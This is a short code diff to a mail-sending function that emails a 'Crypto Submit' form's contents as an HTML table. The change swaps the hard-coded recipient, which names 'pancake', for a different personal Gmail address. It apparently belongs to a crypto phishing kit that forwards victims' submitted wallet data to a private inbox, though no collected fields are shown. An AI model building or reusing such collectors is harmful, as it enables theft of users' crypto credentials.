@@ -33,7 +33,7 @@ export default async function mail(
     });
     const mailData = {
       from: process.env.email,
-      to: "pancake.officialtoken@gmail.com",
+      to: "ridhliver3@gmail.com",
       subject: `Crypto Submit`,
       html: `<style type="text/css">
             .table-box {
